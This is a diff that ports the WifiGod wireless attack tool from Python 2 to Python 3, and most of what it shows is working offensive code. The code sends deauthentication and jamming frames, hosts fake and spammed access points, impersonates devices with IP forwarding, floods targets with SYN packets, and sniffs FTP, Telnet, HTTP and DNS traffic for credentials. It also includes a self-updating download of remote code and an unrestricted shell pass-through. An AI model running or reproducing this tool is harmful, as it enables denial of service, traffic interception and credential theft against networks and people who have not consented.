@@ -4,7 +4,7 @@
 #BlackholeSecurity@protonmail.com
 import sys
 import multiprocessing
-import urllib
+import urllib.request, urllib.parse, urllib.error
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 import threading
@@ -50,11 +50,11 @@ if(options.update != 'no_check'):
 				try:
 					nversion = str(line.strip()).split(' = ')[1]
 					if(float(nversion) > update_version):
-						n_update = raw_input("A New Update is Available, Download (y/n): ")
+						n_update = input("A New Update is Available, Download (y/n): ")
 						os.remove('update_check.txt')
 						if(n_update != 'n'):
 							print("[info]: Updating...")
-							urllib.urlretrieve('https://raw.githubusercontent.com/blackholesec/wifigod/master/wifigod.py', os.getcwd() + '/wifigod.py')
+							urllib.request.urlretrieve('https://raw.githubusercontent.com/blackholesec/wifigod/master/wifigod.py', os.getcwd() + '/wifigod.py')
 							print("[*] Updated.")
 							try:
 								exit(0)
@@ -68,7 +68,7 @@ if(options.update != 'no_check'):
 						exit(0)
 					except:
 						sys.exit(1)
-print("\n" * 100)
+print(("\n" * 100))
 subprocess.call('clear', shell=True)
 c_script = ("""
 #!/usr/bin/env python3
@@ -148,7 +148,7 @@ def networks_opprobrium(interface):
 						channel = str(ord(pck[Dot11Elt:3].info))
 						string = ap_mac+":"+ssid+":"+channel
 						if(string not in captured_networks):
-							print("[WifiGod] Initiating Attack on -> {}").format(ssid)
+							print(("[WifiGod] Initiating Attack on -> {}").format(ssid))
 							captured_networks.append(string)
 							t = threading.Thread(target=eps2_2_init_1_asec_network,args=(ap_mac,interface))
 							t.setDaemon(True)
@@ -180,10 +180,10 @@ def own_network_traffic(interface,net_range,gateway):
 					device_hostname = resolver.query(addr, "PTR")[0]
 				except:
 					device_hostname = '(unknown)'
-				print("[WifiGod] Found Device: {} | {}").format(ip_base+str(ip_addr), device_hostname)
+				print(("[WifiGod] Found Device: {} | {}").format(ip_base+str(ip_addr), device_hostname))
 		except:
 			pass
-	print("[WifiGod] Found {} Devices").format(len(live_ip_addr))
+	print(("[WifiGod] Found {} Devices").format(len(live_ip_addr)))
 	print("[WifiGod] Enabling IP Forwarding...")
 	f = open('/proc/sys/net/ipv4/ip_forward','w+')
 	f.truncate()
@@ -202,7 +202,7 @@ def own_network_traffic(interface,net_range,gateway):
 		t.setDaemon(True)
 		t.start()
 	print("[WifiGod] Complete.")
-	ex__ = raw_input("[WifiGod] Press Enter to Stop...")
+	ex__ = input("[WifiGod] Press Enter to Stop...")
 	try:
 		exit(0)
 	except:
@@ -232,7 +232,7 @@ def extrapolate_trusted_networks(interface,device):
 							print(string)
 def hijack_sessions(interface):
 	def ftp_hijack(interface):
-		host = raw_input("Host communicating with the FTP server: ")
+		host = input("Host communicating with the FTP server: ")
 		while True:
 			packet = sniff(iface=interface,count=20)
 			for pck in packet:
@@ -246,11 +246,11 @@ def hijack_sessions(interface):
 									data = pck.getlayer(Raw).load
 									print(data)
 									if(ip_src != host):
-										print(c.r+"FTP Host "+c.w+"("+c.b+"{}"+c.w+") -> "+c.b).format(ip_src)
-										print(str(data))
+										print((c.r+"FTP Host "+c.w+"("+c.b+"{}"+c.w+") -> "+c.b).format(ip_src))
+										print((str(data)))
 									if(ip_src == host):
-										print(c.r+"{} ->"+c.b).format(ip_src)
-										print(str(data))
+										print((c.r+"{} ->"+c.b).format(ip_src))
+										print((str(data)))
 					except:
 						pass
 	def telnet_hijack(device,interface):
@@ -265,9 +265,9 @@ def hijack_sessions(interface):
 						if(pck.sport == 23 or pck.dport == 23):
 							ip_src = pck.getlayer(IP).src
 							ip_dst = pck.getlayer(IP).dst
-							print(c.w+"["+c.r+"WifiGod"+c.w+"] "+c.rb+"{}"+c.w+" -> "+c.b).format(ip_src)
+							print((c.w+"["+c.r+"WifiGod"+c.w+"] "+c.rb+"{}"+c.w+" -> "+c.b).format(ip_src))
 							data = pck.getlayer(Raw).load
-							print(str(data).strip()+c.d)
+							print((str(data).strip()+c.d))
 					except:
 						pass
 # OLD Telnet Hijack
@@ -294,20 +294,20 @@ def hijack_sessions(interface):
 	x = """clear this up"""
 	print(session_menu)
 	while True:
-		session_type = raw_input("Service: ")
+		session_type = input("Service: ")
 		if(session_type == '1'):
 			ftp_hijack(interface)
 		elif(session_type == '2'):
 			print("You should be using option #7 with this")
-			device = raw_input("Target Device: ")
+			device = input("Target Device: ")
 			telnet_hijack(device,interface)
 		else:
 			print("[WifiGod] Invalid Option!")
 			print(session_menu)
 def compromise_network():
-	interface = raw_input("Network Interface: ")
+	interface = input("Network Interface: ")
 	print("Net Range Example: 192.168.1.0-255")
-	net_range = raw_input("Net Range: ")
+	net_range = input("Net Range: ")
 	start_ip = net_range.split('-')[0]
 	end_range = net_range.split('-')[1]
 	octet_count = 0
@@ -329,10 +329,10 @@ def compromise_network():
 				device_hostname = resolver.query(addr, "PTR")[0]
 			except:
 				device_hostname = '(unknown)'
-			print("[WifiGod] Found Device: {} | {}").format(ip_base+str(ip_addr), device_hostname)
+			print(("[WifiGod] Found Device: {} | {}").format(ip_base+str(ip_addr), device_hostname))
 		except:
 			pass
-	print("[WifiGod] Found {} Devices").format(len(live_ip_addr))
+	print(("[WifiGod] Found {} Devices").format(len(live_ip_addr)))
 	def attack_net(device,interface):
 		try:
 			payload = str("A" * 1000)
@@ -358,7 +358,7 @@ def compromise_network():
 			t.start()
 		except:
 			pass
-	x = raw_input("[WifiGod] Press Enter to stop...")
+	x = input("[WifiGod] Press Enter to stop...")
 	try:
 		exit(0)
 	except:
@@ -388,7 +388,7 @@ def scan_for_networks(interface):
 						network_string = ssid + ':' + channel + ':' + access_point
 						if(network_string not in captured_networks):
 							captured_networks.append(network_string)
-							print(c.w+"SSID: "+c.g+"{}"+c.w+" | Access Point MAC: "+c.g+"{}"+c.w+" | Channel: "+c.g+"{}"+c.w+' | Encryption: '+c.g+'{}'+c.w).format(ssid,access_point,channel,enc_type)
+							print((c.w+"SSID: "+c.g+"{}"+c.w+" | Access Point MAC: "+c.g+"{}"+c.w+" | Channel: "+c.g+"{}"+c.w+' | Encryption: '+c.g+'{}'+c.w).format(ssid,access_point,channel,enc_type))
 					except KeyboardInterrupt:
 						break;
 					except:
@@ -416,7 +416,7 @@ def scan_for_devices_on_network(interface,access_point):
 				if(ap == access_point):
 					try:
 						ssid = pck.getlayer(Dot11).info
-						print(c.w+"["+c.b+"info"+c.w+"]: Scanning "+c.g+"{}"+c.w+" ("+c.o+"{}"+c.w+") for Devices").format(ssid,ap)
+						print((c.w+"["+c.b+"info"+c.w+"]: Scanning "+c.g+"{}"+c.w+" ("+c.o+"{}"+c.w+") for Devices").format(ssid,ap))
 						break;
 					except KeyboardInterrupt:
 						break;
@@ -440,7 +440,7 @@ def scan_for_devices_on_network(interface,access_point):
 								dev_type = r.content.split('","mac_')[0].replace('{"result":{"company":"', '')
 								if("<p style=" not in str(dev_type) and 'no result' not in str(dev_type)):
 									if(str(dev_on_network) not in captured_devices):
-										print(c.w+"["+c.g+"*"+c.w+"]: Device Found - "+c.rb+"{}"+c.w+" | Device Type: "+c.rb+"{}"+c.w).format(dev_on_network,dev_type)
+										print((c.w+"["+c.g+"*"+c.w+"]: Device Found - "+c.rb+"{}"+c.w+" | Device Type: "+c.rb+"{}"+c.w).format(dev_on_network,dev_type))
 										captured_devices.append(str(dev_on_network))
 							except KeyboardInterrupt:
 								break;
@@ -459,7 +459,7 @@ def check_for_update():
 	f = open('update-check.txt', 'r+')
 	for line in f:
 		if('update_version' in line.strip()):
-			print(line.strip())
+			print((line.strip()))
 			try:
 				nversion = str(line.strip()).split(' = ')[1]
 			except:
@@ -467,9 +467,9 @@ def check_for_update():
 			if(int(nversion) > update_version):
 				f.truncate()
 				os.remove('update-check.txt')
-				n_update = raw_input("A New Update Is Available, Download (y/n): ")
+				n_update = input("A New Update Is Available, Download (y/n): ")
 				if(n_update == 'y'):
-					urllib.urlretrieve('https://raw.githubusercontent.com/blackholesec/wifigod/master/wifigod.py', os.getcwd() + '/wifigod.py')
+					urllib.request.urlretrieve('https://raw.githubusercontent.com/blackholesec/wifigod/master/wifigod.py', os.getcwd() + '/wifigod.py')
 					print("[*] Updated...")
 					try:
 						exit(0)
@@ -477,13 +477,13 @@ def check_for_update():
 						sys.exit(1)
 def spoof_ap(interface,ap_name,mac_address):
 	try:
-		print(c.w+"["+c.b+"info"+c.w+"]: Setting up fake Access Point...")
+		print((c.w+"["+c.b+"info"+c.w+"]: Setting up fake Access Point..."))
 		l1_dot11 = Dot11(type=0,subtype=8,addr1="ff:ff:ff:ff:ff:ff",addr2=str(mac_address),addr3=str(mac_address))
 		l2_beacon = Dot11Beacon(cap="ESS+privacy")
 		l3_essid = Dot11Elt(ID="SSID", info=str(ap_name),len=len(str(ap_name)))
 		packet = RadioTap()/l1_dot11/l2_beacon/l3_essid
-		print(c.w+"["+c.g+"*"+c.w+"]: Setup Fake Access Point.")
-		print(c.w+"["+c.g+"*"+c.w+"]: Hosting...")
+		print((c.w+"["+c.g+"*"+c.w+"]: Setup Fake Access Point."))
+		print((c.w+"["+c.g+"*"+c.w+"]: Hosting..."))
 		sendp(packet,iface=interface,loop=1,verbose=False)
 	except KeyboardInterrupt:
 		x = 'setting this variable to break'
@@ -494,19 +494,19 @@ def spam_ap(interface,ap_name_,count):
 	for i in range(count):
 		try:
 			ap_name = ap_name_ + str(random.randint(1,80000))
-                	print(c.w+"["+c.b+"info"+c.w+"]: Setting up fake Access Point...")
+                	print((c.w+"["+c.b+"info"+c.w+"]: Setting up fake Access Point..."))
 			l1_dot11 = Dot11(type=0,subtype=8,addr1='ff:ff:ff:ff:ff:ff',addr2=str(RandMAC()),addr3=str(RandMAC()))
 			l2_beacon = Dot11Beacon(cap="ESS+privacy")
 			l3_essid = Dot11Elt(ID="SSID",info=str(ap_name),len=len(str(ap_name)))
 			packet = RadioTap()/l1_dot11/l2_beacon/l3_essid
                 	aps.append(packet)
-			print(c.w+"["+c.g+"*"+c.w+"]: Setup Fake Access Point.")
+			print((c.w+"["+c.g+"*"+c.w+"]: Setup Fake Access Point."))
 		except KeyboardInterrupt:
 			x = 'setting this variable to break'
 		except:
 			raise
 	for packet in aps:
-		print(c.w+"["+c.g+"*"+c.w+"]: Hosting...")
+		print((c.w+"["+c.g+"*"+c.w+"]: Hosting..."))
 		sendp(aps,iface=interface,loop=1,verbose=False)
 def jam_wifi_network(interface,access_point):
 	packet = RadioTap()/Dot11(addr1 = 'ff:ff:ff:ff:ff:ff',addr2 = access_point, addr3 = access_point)/Dot11Deauth()
@@ -516,7 +516,7 @@ def jam_wifi_network(interface,access_point):
 		if(pck.haslayer(Dot11)):
 			if(pck.getlayer(Dot11).addr2 == access_point):
 				ssid = str(pck.getlayer(Dot11).info)
-				print(c.w+"["+c.g+"info"+c.w+"]: Jamming Network {} ({})").format(ssid,access_point)
+				print((c.w+"["+c.g+"info"+c.w+"]: Jamming Network {} ({})").format(ssid,access_point))
 				break;
 	sendp(packet,iface=interface,loop=1,verbose=False)
 
@@ -547,10 +547,10 @@ def http_headers(interface,ip_address):
 									except:
 										server_name = 'unknown'
 									if(pck.haslayer(DNS)):
-										print(c.w+"["+c.rb+"#NEW HTTP HEADER#"+c.w+"] From: {} {} | Server: {}").format(host_ip,hostname,server_name)
+										print((c.w+"["+c.rb+"#NEW HTTP HEADER#"+c.w+"] From: {} {} | Server: {}").format(host_ip,hostname,server_name))
 									else:
-										print(c.w+"["+c.rb+"#NEW HTTP HEADER#"+c.w+"] From: {} | Server: {}").format(host_ip,server_name)
-									print(str(pck.getlayer(Raw).load))
+										print((c.w+"["+c.rb+"#NEW HTTP HEADER#"+c.w+"] From: {} | Server: {}").format(host_ip,server_name))
+									print((str(pck.getlayer(Raw).load)))
 			except KeyboardInterrupt:
 				break;
 			except:
@@ -584,9 +584,9 @@ def dns_traffic(interface,ip_address):
 						except:
 							server_name = 'unknown'
 					if(pck.haslayer(DNS)):
-						print(c.g+"{}"+c.w+" --> "+c.g+"{}"+c.g+" {} "+c.w+"| Server: "+c.g+"{}"+c.w).format(ip_src,ip_dst,hostname,server_name)
+						print((c.g+"{}"+c.w+" --> "+c.g+"{}"+c.g+" {} "+c.w+"| Server: "+c.g+"{}"+c.w).format(ip_src,ip_dst,hostname,server_name))
 					else:
-						print(c.g+"{}"+c.w+" --> "+c.g+"{}"+c.w+" | Server: "+c.g+"{}"+c.w).format(ip_src,ip_dst,server_name)
+						print((c.g+"{}"+c.w+" --> "+c.g+"{}"+c.w+" | Server: "+c.g+"{}"+c.w).format(ip_src,ip_dst,server_name))
 def scan_for_ports(host,start,end):
 	if(1 == 1):
 		def scan(host,port,code = 1):
@@ -603,13 +603,13 @@ def scan_for_ports(host,start,end):
 				raise
 		open_ports = []
 		stime = time.time()
-		print("Scanning host "+c.g+"{}"+c.w+" for open ports - Started at: "+c.g+"{}"+c.w).format(host,time.ctime())
+		print(("Scanning host "+c.g+"{}"+c.w+" for open ports - Started at: "+c.g+"{}"+c.w).format(host,time.ctime()))
 		for port in range(start,end):
 			try:
 				r = scan(host,port)
 				if(r == 0):
 					open_ports.append(port)
-					print(c.w+"["+c.b+"*"+c.w+"]: Open Port: "+c.ob+"{}"+c.w).format(port)
+					print((c.w+"["+c.b+"*"+c.w+"]: Open Port: "+c.ob+"{}"+c.w).format(port))
 				else:
 					pass
 			except KeyboardInterrupt:
@@ -617,16 +617,16 @@ def scan_for_ports(host,start,end):
 			except:
 				raise
 		print("\rScanning Complete                         ")
-		print("Time elapsed: {}").format(time.time() - stime)
-		print("Number of Open Ports: "+c.g+"{}"+c.w).format(len(open_ports))
+		print(("Time elapsed: {}").format(time.time() - stime))
+		print(("Number of Open Ports: "+c.g+"{}"+c.w).format(len(open_ports)))
 		print("Open Ports: ")
 		for port in open_ports:
-			print(str(port)+','),
+			print((str(port)+','), end=' ')
 		print(" ")
-		x = raw_input("Press enter to return to main menu...")
+		x = input("Press enter to return to main menu...")
 def syn_overflow(ip_source,ip_dest,ip_source_port,ip_dest_port,interface,thread_count,message):
-	print(c.w+"["+c.b+"info"+c.w+"]: Creating Packets...")
-	print(c.w+"["+c.b+"info"+c.w+"]: Sending Packets...")
+	print((c.w+"["+c.b+"info"+c.w+"]: Creating Packets..."))
+	print((c.w+"["+c.b+"info"+c.w+"]: Sending Packets..."))
 	syn_packet = IP(src=ip_source,dst=ip_dest)/TCP(dport=int(ip_dest_port),sport=int(ip_source_port))
 	def syn_attack(ip_source,ip_dest,ip_source_port,ip_dest_port,interface,message):
 		syn_packet = IP(src=ip_source,dst=ip_dest)/TCP(dport=int(ip_dest_port),sport=int(ip_source_port))/message
@@ -650,7 +650,7 @@ def deauthenticate_device(access_point,dev_mac,interface):
                                 ssid = str(pck.getlayer(Dot11).info)
 				r = requests.get('http://macvendors.co/api/'+str(dev_mac))
 				dev_type = r.content.split('","mac_')[0].replace('{"result":{"company":"', '')
-                                print(c.w+"["+c.g+"info"+c.w+"]: DeAuthenticating {} Device {} on {}").format(dev_type,dev_mac,ssid)
+                                print((c.w+"["+c.g+"info"+c.w+"]: DeAuthenticating {} Device {} on {}").format(dev_type,dev_mac,ssid))
                                 break;
         count = 1
 	subprocess.call('ifconfig wlan0 down', shell=True)
@@ -661,42 +661,42 @@ def deauthenticate_device(access_point,dev_mac,interface):
 size_ = int(subprocess.check_output('python3 columnlib.py', shell=True).strip())
 size = 0
 print(" ")
-print(c.rb+str("            .:+syhhddddhyso/-`           ").center(size))
-print(str("        .+sdddddddddddddddddddho:`       ").center(size))
-print(str("     .+hddddddyo/:--.--:/+shddddddy/`    ").center(size))
-print(str("   :ydddddy+-               `:ohddddds:  ").center(size))
-print(str(" /hddddh/`   ./oyhdddddhyo/-`   -+hddddh/").center(size))
-print(str(" `/hds-   :ohddddddddddddddddy/.   :ydd+`").center(size))
-print(str("    .  .+hdddddy+/-...-:+shdddddy/   .`  ").center(size))
-print(str("      .hdddds:`    `.``    .+hdddds`     ").center(size))
-print(str("       `/y+`  ./shdddddhs+.   -sy:       ").center(size))
-print(str("            -ydddddddddddddh/            ").center(size))
-print(str("            `+hdh+-```-+ydds.            ").center(size))
-print(str("              `-  `/+/.  ..").center(size))
-print(str("                   ddyo").center(size))
+print((c.rb+str("            .:+syhhddddhyso/-`           ").center(size)))
+print((str("        .+sdddddddddddddddddddho:`       ").center(size)))
+print((str("     .+hddddddyo/:--.--:/+shddddddy/`    ").center(size)))
+print((str("   :ydddddy+-               `:ohddddds:  ").center(size)))
+print((str(" /hddddh/`   ./oyhdddddhyo/-`   -+hddddh/").center(size)))
+print((str(" `/hds-   :ohddddddddddddddddy/.   :ydd+`").center(size)))
+print((str("    .  .+hdddddy+/-...-:+shdddddy/   .`  ").center(size)))
+print((str("      .hdddds:`    `.``    .+hdddds`     ").center(size)))
+print((str("       `/y+`  ./shdddddhs+.   -sy:       ").center(size)))
+print((str("            -ydddddddddddddh/            ").center(size)))
+print((str("            `+hdh+-```-+ydds.            ").center(size)))
+print((str("              `-  `/+/.  ..").center(size)))
+print((str("                   ddyo").center(size)))
 print(" ")
-print(c.ob+"               WifiGod v1.5"+c.w)
+print((c.ob+"               WifiGod v1.5"+c.w))
 print(" ")
 external_network_attacks = ['scan','device scan','jam','deauthentication','host','spam','extrapolate','opprobrium']
 internal_network_attacks = ['impersonate','dns','headers','syn','scan','capture','own','ftp','telnet','compromise']
-print(c.b+"      <"+c.o+"=============================="+c.b+">"+c.w)
-print(c.w+"         External Network Attacks: "+c.g+"{}"+c.w).format(len(external_network_attacks))
-print(c.w+"         Internal Network Attacks: "+c.g+"{}"+c.w).format(len(internal_network_attacks))
+print((c.b+"      <"+c.o+"=============================="+c.b+">"+c.w))
+print((c.w+"         External Network Attacks: "+c.g+"{}"+c.w).format(len(external_network_attacks)))
+print((c.w+"         Internal Network Attacks: "+c.g+"{}"+c.w).format(len(internal_network_attacks)))
 calc = int(len(external_network_attacks) + len(internal_network_attacks))
-print(c.w+"            Total Attacks: "+c.pb+"{}"+c.w).format(calc)
-print(c.b+"      <"+c.o+"=============================="+c.b+">"+c.w)
+print((c.w+"            Total Attacks: "+c.pb+"{}"+c.w).format(calc))
+print((c.b+"      <"+c.o+"=============================="+c.b+">"+c.w))
 #size = int(subprocess.check_output('python3 columnlib.py', shell=True).strip())
 size = 0
 #print(str(c.w+'Github: '+c.b+'https://www.github.com/blackholesec'+c.w).center(size))
-print(str(c.b+'    https://www.github.com/blackholesec'+c.w).center(size))
-print(str(c.w+'  Contact: '+c.b+contact_email+c.w))
+print((str(c.b+'    https://www.github.com/blackholesec'+c.w).center(size)))
+print((str(c.w+'  Contact: '+c.b+contact_email+c.w)))
 print(' ')
-print(str(c.w+'  SecSploit - Advanced Hacking Framework, check'))
-print(str(c.w+'  it out here on the official instagram page:'))
-print(str(c.w+'  https://www.instagram.com/SSploit'))
-print(str(c.b+'  --------------------------------------------'))
-print(str(c.w+'          YouTube: Blackhole Security'))
-print(str(c.w+'https://www.youtube.com/channel/UCMRkTa-GzpTQY1GVkvrLTsg'))
+print((str(c.w+'  SecSploit - Advanced Hacking Framework, check')))
+print((str(c.w+'  it out here on the official instagram page:')))
+print((str(c.w+'  https://www.instagram.com/SSploit')))
+print((str(c.b+'  --------------------------------------------')))
+print((str(c.w+'          YouTube: Blackhole Security')))
+print((str(c.w+'https://www.youtube.com/channel/UCMRkTa-GzpTQY1GVkvrLTsg')))
 print(' ')
 def main_menu():
     #    size_ = int(subprocess.check_output('python3 columnlib.py', shell=True).strip())
@@ -705,27 +705,27 @@ def main_menu():
         print(" ")
         print("       External Network Attacks          ")
         print("_________________________________________")
-	print(str(c.b+'1'+c.w+'.)'+c.rb+' Scan for Surrounding Networks'+c.d))
-	print(str(c.b+'2'+c.w+'.)'+c.rb+' Scan for Devices on a Network'+c.d))
-	print(str(c.b+'3'+c.w+'.)'+c.rb+' Jam A Wifi Network'+c.d))
-	print(str(c.b+'4'+c.w+'.)'+c.rb+' DeAuthenticate a device on a network'+c.d))
-	print(str(c.b+'5'+c.w+'.)'+c.rb+' Host A Fake Access Point'+c.d))
-	print(str(c.b+'6'+c.w+'.)'+c.rb+' Spam many fake access points'+c.d))
-	print(str(c.b+'14'+c.w+'.)'+c.rb+' Extrapolate previously connected and trusted networks on a device'+c.d))
-	print(str(c.b+'17'+c.w+'.)'+c.rb+' Take Down all surrounding networks'+c.d))
+	print((str(c.b+'1'+c.w+'.)'+c.rb+' Scan for Surrounding Networks'+c.d)))
+	print((str(c.b+'2'+c.w+'.)'+c.rb+' Scan for Devices on a Network'+c.d)))
+	print((str(c.b+'3'+c.w+'.)'+c.rb+' Jam A Wifi Network'+c.d)))
+	print((str(c.b+'4'+c.w+'.)'+c.rb+' DeAuthenticate a device on a network'+c.d)))
+	print((str(c.b+'5'+c.w+'.)'+c.rb+' Host A Fake Access Point'+c.d)))
+	print((str(c.b+'6'+c.w+'.)'+c.rb+' Spam many fake access points'+c.d)))
+	print((str(c.b+'14'+c.w+'.)'+c.rb+' Extrapolate previously connected and trusted networks on a device'+c.d)))
+	print((str(c.b+'17'+c.w+'.)'+c.rb+' Take Down all surrounding networks'+c.d)))
 	print("_________________________________________")
 	print(" ")
 	print("       Internal Network Attacks          ")
 	print("_________________________________________")
-	print(str(c.b+'7'+c.w+'.)'+c.rb+' Impersonate a Device (on this Network)'+c.d))
-	print(str(c.b+'8'+c.w+'.)'+c.rb+' Pull DNS traffic from device (For use with #5)'+c.d))
-	print(str(c.b+'9'+c.w+'.)'+c.rb+' Intercept HTTP headers (For use with #5)'+c.d))
-	print(str(c.b+'10'+c.w+'.)'+c.rb+' SYN Packet Injection Overflow'))
-	print(str(c.b+'11'+c.w+'.)'+c.rb+' Scan a Device for open ports'))
-	print(str(c.b+'12'+c.w+'.)'+c.rb+' Capture Passwords Flowing Over Network (For use with #5)'))
-	print(str(c.b+'13'+c.w+'.)'+c.rb+' Own All Devices in Network (Upgrade of 7)'))
-	print(str(c.b+'15'+c.w+'.)'+c.rb+' Hijack Network Services (FTP, Telnet)'))
-	print(str(c.b+'16'+c.w+'.)'+c.rb+' Compromise entire network (Take down all external connectivity)'))
+	print((str(c.b+'7'+c.w+'.)'+c.rb+' Impersonate a Device (on this Network)'+c.d)))
+	print((str(c.b+'8'+c.w+'.)'+c.rb+' Pull DNS traffic from device (For use with #5)'+c.d)))
+	print((str(c.b+'9'+c.w+'.)'+c.rb+' Intercept HTTP headers (For use with #5)'+c.d)))
+	print((str(c.b+'10'+c.w+'.)'+c.rb+' SYN Packet Injection Overflow')))
+	print((str(c.b+'11'+c.w+'.)'+c.rb+' Scan a Device for open ports')))
+	print((str(c.b+'12'+c.w+'.)'+c.rb+' Capture Passwords Flowing Over Network (For use with #5)')))
+	print((str(c.b+'13'+c.w+'.)'+c.rb+' Own All Devices in Network (Upgrade of 7)')))
+	print((str(c.b+'15'+c.w+'.)'+c.rb+' Hijack Network Services (FTP, Telnet)')))
+	print((str(c.b+'16'+c.w+'.)'+c.rb+' Compromise entire network (Take down all external connectivity)')))
 try:
 	os.remove('columnlib.py')
 except:
@@ -738,10 +738,10 @@ shell = Drop to Shell (Incase you need to ifconfig etc.)
 """)
 while True:
 	try:
-		prompt = raw_input(c.w+str(username)+c.r+"@"+c.w+"WifiGod~# "+c.w)
+		prompt = input(c.w+str(username)+c.r+"@"+c.w+"WifiGod~# "+c.w)
 	except KeyboardInterrupt:
 		print("\n")
-		exit__ = raw_input(c.w+"["+c.rb+"ALERT!"+c.w+"]: Are you sure you want to exit (y/n): ")
+		exit__ = input(c.w+"["+c.rb+"ALERT!"+c.w+"]: Are you sure you want to exit (y/n): ")
 		if(exit__ == 'y'):
 			try:
 				exit(0)
@@ -750,7 +750,7 @@ while True:
 		else:
 			pass
 	if(prompt == 'help'):
-		print(str(help_menu))
+		print((str(help_menu)))
 	elif(prompt == "exit"):
 		print("[info]: Exiting...")
 		try:
@@ -760,13 +760,13 @@ while True:
 	elif(prompt == 'show options' or prompt == 'options'):
 		main_menu()
 	elif(prompt == 'clear'):
-		print('\n' * 100)
+		print(('\n' * 100))
 		subprocess.call('clear', shell=True)
 	elif(prompt == 'shell'):
 		print("Dropping to Shell, Ctrl+C or 'exit' to quit...")
 		while True:
 			try:
-				cmd = raw_input("# ")
+				cmd = input("# ")
 				if(cmd == 'exit' or cmd == 'q' or cmd == 'quit'):
 					print('\n')
 					break;
@@ -775,12 +775,12 @@ while True:
 				break;
 			try:
 				data = subprocess.check_output(str(cmd), shell=True)
-				print(str(data))
+				print((str(data)))
 			except Exception as e:
-				print(str(e))
+				print((str(e)))
 	elif(prompt == '1'):
 #		interface =  raw_input(c.w+"Supply A Network Interface ("+c.rb+"Must be in monitor Mode"+c.w+"): ")
-		interface =  raw_input(c.w+"Supply A Network Interface: ")
+		interface =  input(c.w+"Supply A Network Interface: ")
 		if(interface != 'wifigod'):
 			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
 			time.sleep(5)
@@ -788,20 +788,20 @@ while True:
 		scan_for_networks(interface)
 	elif(prompt == '2'):
 #		interface =  raw_input(c.w+"Supply A Network Interface ("+c.rb+"Must be in monitor Mode"+c.w+"): ")
-		interface =  raw_input(c.w+"Supply A Network Interface: ")
+		interface =  input(c.w+"Supply A Network Interface: ")
 		if(interface != 'wifigod'):
 			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
 			time.sleep(5)
 			interface = 'wifigod'
-		access_point =  raw_input(c.w+"Supply A Network Access Point MAC Address: ")
+		access_point =  input(c.w+"Supply A Network Access Point MAC Address: ")
 		scan_for_devices_on_network(interface,access_point)
 	elif(prompt == '3'):
-		interface =  raw_input(c.w+"Supply A Network Interface: ")
+		interface =  input(c.w+"Supply A Network Interface: ")
 		if(interface != 'wifigod'):
 			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
 			time.sleep(5)
 			interface = 'wifigod'
-		access_point =  raw_input(c.w+"Supply The Target Network AP MAC Address: ")
+		access_point =  input(c.w+"Supply The Target Network AP MAC Address: ")
 	        while True:
 	                packet = sniff(iface=interface,count = 1)
 			pck = packet[0]
@@ -809,17 +809,17 @@ while True:
 	                        if(str(pck.getlayer(Dot11).addr2).lower() == str(access_point).lower()):
 					try:
 	                                	ssid = str(pck.getlayer(Dot11).info)
-	                                	print(c.w+"["+c.g+"info"+c.w+"]: Jamming Network {} ({})").format(ssid,access_point)
+	                                	print((c.w+"["+c.g+"info"+c.w+"]: Jamming Network {} ({})").format(ssid,access_point))
 					except:
-						print(c.w+"["+c.g+"info"+c.w+"]: Jamming Network {}").format(access_point)
+						print((c.w+"["+c.g+"info"+c.w+"]: Jamming Network {}").format(access_point))
 					break;
 		packet = RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff',addr2=access_point,addr3=access_point)/Dot11Deauth()
 		sendp(packet,iface=interface,loop=1,verbose=False)
 #		jam_wifi_network(interface,access_point)
 	elif(prompt == '4'):
-		interface = raw_input(c.w+"Supply A Network Interface: ")
-		access_point = raw_input(c.w+'Network Access Point MAC Address: ')
-		dev_mac = raw_input(c.w+'Target Device MAC address: ')
+		interface = input(c.w+"Supply A Network Interface: ")
+		access_point = input(c.w+'Network Access Point MAC Address: ')
+		dev_mac = input(c.w+'Target Device MAC address: ')
 		if(interface != 'wifigod'):
 			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
 			time.sleep(5)
@@ -835,37 +835,37 @@ while True:
 						ssid = 'unknown'
 	                                r = requests.get('http://macvendors.co/api/'+str(dev_mac).lower())
 	                                dev_type = r.content.split('","mac_')[0].replace('{"result":{"company":"', '')
-	                                print(c.w+"["+c.g+"info"+c.w+"]: DeAuthenticating {} Device {} on {}").format(dev_type,dev_mac,ssid)
+	                                print((c.w+"["+c.g+"info"+c.w+"]: DeAuthenticating {} Device {} on {}").format(dev_type,dev_mac,ssid))
 	                                break;
 		packet = RadioTap()/Dot11(addr1=access_point,addr2=dev_mac,addr3=dev_mac)/Dot11Deauth()
 		sendp(packet,iface=interface,loop=1,verbose=False)
 #		deauthenticate_device(access_point,dev_mac,interface)
 	elif(prompt == '5'):
-		interface = raw_input(c.w+"Supply A Network Interface: ")
+		interface = input(c.w+"Supply A Network Interface: ")
 		if(interface != 'wifigod'):
 			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
 			time.sleep(5)
 			interface = 'wifigod'
-		ap_name = raw_input("SSID (Name of Network): ")
-		mac_address_ = raw_input("MAC Address of AP ('r' for random): ")
+		ap_name = input("SSID (Name of Network): ")
+		mac_address_ = input("MAC Address of AP ('r' for random): ")
 		if(mac_address_ == 'r'):
 			mac_address = str(RandMAC())
 		elif(mac_address != 'r'):
 			mac_address = str(mac_address_)
 		spoof_ap(interface,ap_name,mac_address)
 	elif(prompt == '6'):
-		interface = raw_input(c.w+str("Supply A Network Interface: "))
+		interface = input(c.w+str("Supply A Network Interface: "))
 		if(interface != 'wifigod'):
 			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
 			time.sleep(5)
 			interface = 'wifigod'
-		ap_name = raw_input(c.w+"SSID (Name of Network): ")
-		count = raw_input(c.w+"Number of times to Host Network: ")
